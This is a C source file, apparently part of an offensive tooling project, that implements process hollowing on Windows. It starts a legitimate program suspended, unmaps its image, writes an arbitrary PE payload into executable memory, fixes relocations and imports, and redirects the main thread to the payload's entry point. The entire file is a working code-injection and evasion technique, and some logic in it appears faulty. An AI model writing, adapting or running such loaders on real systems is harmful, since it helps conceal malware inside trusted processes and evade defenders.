#include "Techniques.h"
#include "macros.h"
#include "structs.h"


int ProcessHollowing(peinfos infos,char *path)
{

	int errorcount;
	int HIGHLOW = 0;
	int x64 = 0;
	int absolute = 0;
	BYTE* BaseAddress = infos.pe;
	NtUnmapViewOfSection_t NtUnmapViewOfSection = NULL;
	NtQueryInformationProcess_t NtQueryInformationProcess = NULL;
	//okay("0x%p", infos.ntHeader->OptionalHeader.DataDirectory[1].VirtualAddress);
	//infos.ntHeader->OptionalHeader.DataDirectory[1].VirtualAddress = 0x00000000000038F8;
	
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	_PROCESS_BASIC_INFORMATION pbi;
	PVOID baseAddress = NULL;
	BYTE* NewAddress = NULL;

	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
	if (hNtDll == NULL)
	{
		error("Failed To Get NtDll Handle");
		return -1;
	}
	okay("Got Handle To NtDll");
	if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		
		error("CreateProcessA failed: %lu", GetLastError());
		return -1;
	} 
	okay("Process Created In A susspeneded State PID(%d)", pi.dwProcessId);
	NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtDll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) {
		error("Failed To Get NtQueryInformationProcess Address");
		return -1;
	}

	NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
	if (status != 0) {
		error("Failed To Read Process Informations (NTSTATUS: 0x%X)", status);
	}
	okay("Got Peb BASEADDRESS(0x%p)", pbi.PebBaseAddress);
	
	
	if (!pbi.PebBaseAddress) {
		error("PEB Base Address is NULL");
	}

	if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &baseAddress, sizeof(PVOID), NULL)) {
		error("Failed to read ImageBaseAddress from target PEB");
	}
	okay("Remote Image Base Address Is 0x%p", baseAddress);
	
	
	
	
	NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtDll, "NtUnmapViewOfSection");
	if (NtUnmapViewOfSection == NULL)
	{
		error("Failed To Get NtUnmapViewOfSection address");
		return -1;
	}
	//g
	status = NtUnmapViewOfSection(pi.hProcess, baseAddress);
	if (status != 0) {
		error("Failed To Unmap Process base address section (NTSTATUS: 0x%X)", status);
	}
	okay("Unmapped The Target process");
	NewAddress = VirtualAllocEx(pi.hProcess, baseAddress, infos.ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NewAddress == NULL)
	{
		error("Failed to allocate space at the unmapped address");
	}
	okay("Allocated Space At 0x%p",NewAddress);
	WriteProcessMemory(pi.hProcess, NewAddress, infos.pe, infos.ntHeader->OptionalHeader.SizeOfHeaders, NULL);
	okay("Headers Written Into Target Process");
	PIMAGE_SECTION_HEADER sectionHeader = infos.sectionHeader;
	okay("Found %d Sections", infos.ntHeader->FileHeader.NumberOfSections);
	for (int i = 0; i != infos.ntHeader->FileHeader.NumberOfSections; i++, sectionHeader++)
	{
		if (!WriteProcessMemory(pi.hProcess, NewAddress + sectionHeader->VirtualAddress, infos.pe + sectionHeader->PointerToRawData,sectionHeader->SizeOfRawData, NULL))
		{
			error("Failed To Write Section %d Into Hollowed Process", i);
		}
		else
		{
			okay("Section %s Written At 0x%p", sectionHeader->Name, sectionHeader->VirtualAddress);
		}
	}
	okay("Sections Written Into Target Process");
	//Base Relocations
	errorcount = 0;
	okay("Now Preforming base relocations --------");
	DWORD relocDirSize = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	DWORD Delta = (ULONGLONG)(NewAddress - infos.ntHeader->OptionalHeader.ImageBase);

	IMAGE_DATA_DIRECTORY relocDir = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (Delta != 0 && relocDirSize != 0)
	{
		okay("Delta is not zero relocations needed (0x%d)",Delta);
		
		IMAGE_BASE_RELOCATION* relocData = (IMAGE_BASE_RELOCATION*)malloc(relocDirSize);
		
		DWORD bytesRead = 0;
		DWORD relocRVA = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		if (!ReadProcessMemory(pi.hProcess, NewAddress + relocRVA, relocData, relocDirSize, &bytesRead) || bytesRead != relocDirSize) {
			error("Failed to read relocation data");
			free(relocData);
			return;
		}

		IMAGE_BASE_RELOCATION* currentBlock = relocData;
		SIZE_T parsedSize = 0;
		while (parsedSize < relocDirSize && currentBlock->SizeOfBlock)
		{
			if (currentBlock->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {
				error("Invalid SizeOfBlock in relocation block");
				break;
			}
			DWORD entriesCount = (currentBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			WORD* relocEntries = (WORD*)(relocData + 1);
			for (int i = 0; i < entriesCount; i++)
			{
				WORD entry = relocEntries[i];
				WORD type = entry >> 12;
				WORD offset = entry & 0x0FFF;
				ULONGLONG patchAddr = NewAddress + currentBlock->VirtualAddress + offset;
				//okay("Entries count (%d) || offset 0x%p || patchaddr (0x%p) || reloc rva (0x%p) || reloc size (0x%p) || sizeofblock (0x%p)", entriesCount, offset, patchAddr, currentBlock->VirtualAddress, relocDirSize, currentBlock->SizeOfBlock);
				if (patchAddr < (ULONGLONG)NewAddress || patchAddr >= (ULONGLONG)(NewAddress + infos.ntHeader->OptionalHeader.SizeOfImage)) {
					error("Invalid patch address: 0x%llx", patchAddr);
					if (errorcount == 10)
					{
						return -1;
					}
					errorcount++;
					
				}
				switch (type) {
				case IMAGE_REL_BASED_DIR64: {
					ULONGLONG value = 0;
					if (!ReadProcessMemory(pi.hProcess, (LPCVOID)patchAddr, &value, sizeof(value), NULL))
					{
						error("Failed To Read Patch Address");
					}
					value += Delta;
					if (!WriteProcessMemory(pi.hProcess, (LPVOID)patchAddr, &value, sizeof(value), NULL))
					{
						error("Failed To Patch Address");
					}
					x64++;
					break;
				}
				case IMAGE_REL_BASED_HIGHLOW: {
					DWORD value = 0;
					if(!ReadProcessMemory(pi.hProcess, (LPCVOID)patchAddr, &value, sizeof(value), NULL))
					{
						error("Failed To Read Patch Address");
					}
					value += (DWORD)Delta;
					if (!WriteProcessMemory(pi.hProcess, (LPVOID)patchAddr, &value, sizeof(value), NULL))
					{
						error("Failed To Patch Address");
					}
					HIGHLOW++;
					break;
				}
				case IMAGE_REL_BASED_ABSOLUTE:
					absolute++;
					break;
				default:
					break;
				}
			}
			parsedSize += currentBlock->SizeOfBlock;
			currentBlock = (PIMAGE_BASE_RELOCATION)((BYTE*)currentBlock + currentBlock->SizeOfBlock);

		}
	
		
		okay("Relocations done IMAGE_REL_BASED_DIR64 (%d found) IMAGE_HIGH_LOW (%d found) Absolute (%d Found)",x64,HIGHLOW,absolute);
	}
	//resolving imports
	okay("Now Resolving Imports --------");
	okay("ImportRVA 0x%p", infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	if (infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0)
	{

		//DWORD importRVA = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
		//DWORD importSize = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
		DWORD importRVA = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
		DWORD importSize = infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
		IMAGE_IMPORT_DESCRIPTOR* importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(infos.pe + infos.ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		okay("SIZE : 0x%p RVA : 0x%p", importSize, importRVA);
		DWORD bytesRead = 0;
		//PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)malloc(importSize);

		//if (!ReadProcessMemory(pi.hProcess, NewAddress + importRVA, importDesc,importSize, &bytesRead) || bytesRead != importSize) {
		//	error("Failed to read import data");
		//	free(importDesc);
		//	return -1;
		//}
		//PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(infos.pe + importRVA);

		SIZE_T descriptorSize = sizeof(IMAGE_IMPORT_DESCRIPTOR);
		okay("import name 0x%p  0x%p  0x%p  0x%p ", importDesc->Name,importDesc->Characteristics,importDesc->TimeDateStamp,importDesc->FirstThunk);
		PIMAGE_IMPORT_DESCRIPTOR currentDesc = importDesc;
		while (currentDesc->Name)
		{
			okay("1--------------");
			const char* dllName = (char*)(infos.pe + currentDesc->Name);
			HMODULE dllHandle = GetModuleHandleA(dllName);
			okay("1--------------");
			if (!dllHandle) dllHandle = LoadLibraryA(dllName);
			okay("Got Handle To %s", dllName);
			PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)(infos.pe + currentDesc->OriginalFirstThunk);
			PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)(infos.pe + currentDesc->FirstThunk);
			while (origThunk->u1.AddressOfData)
			{
				FARPROC funcAddress = NULL;
				if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
				{
					WORD ordinal = (WORD)(origThunk->u1.Ordinal & 0xFFFF);
					funcAddress = GetProcAddress(dllHandle, (LPCSTR)(uintptr_t)ordinal);

				}
				else
				{
					PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(infos.pe + origThunk->u1.AddressOfData);
					char* funcName = (char*)importByName->Name;
					funcAddress = GetProcAddress(dllHandle, funcName);
					okay("Now Patching %s", funcName);
				
				}
				ULONGLONG remoteIATEntry = (ULONGLONG)NewAddress + currentDesc->FirstThunk + ((BYTE*)firstThunk - (BYTE*)(infos.pe + currentDesc->FirstThunk));
				SIZE_T bytesWritten1 = 0;
				if (!WriteProcessMemory(pi.hProcess, (LPVOID)remoteIATEntry, &funcAddress, sizeof(funcAddress), &bytesWritten1)) {
					error("Failed to write to remote IAT");
					return -1;
				}
				okay("Written %d", bytesRead);
				origThunk++;
				firstThunk++;
			
			
			//
			}
			 currentDesc++;


		}
	}
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(pi.hThread, &ctx)) {
		error("GetThreadContext failed: %lu\n", GetLastError());
		return -1;
	}
	okay("Got Thread Context");
	printf("[+] Original EIP: 0x%08lx\n", ctx.Rip);
	ctx.Rip = (DWORD_PTR)(NewAddress + infos.ntHeader->OptionalHeader.AddressOfEntryPoint);
	okay("Address Of Entry Point 0x%p ADDRESS (0x%p)", infos.ntHeader->OptionalHeader.AddressOfEntryPoint,NewAddress);

	printf("[+] Thread context updated. New EIP: 0x%08X\n", ctx.Rip);
	
	if (!SetThreadContext(pi.hThread, &ctx)) {
		error("SetThreadContext failed: %lu\n", GetLastError());
		return -1;
	}
	okay("About to resume thread with entry point at: 0x%p",
		NewAddress + infos.ntHeader->OptionalHeader.AddressOfEntryPoint);

	getchar();
	if (ResumeThread(pi.hThread) == (DWORD)-1) {
		error("Failed to resume thread: %lu\n", GetLastError());
		return -1;
	}
	okay("Thread Resumed");
	WaitForSingleObjectEx(pi.hThread, INFINITE, FALSE);
	DWORD exitCode;
	if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
		printf("Process exited with code: 0x%X\n", exitCode);
	}
	return 0;







}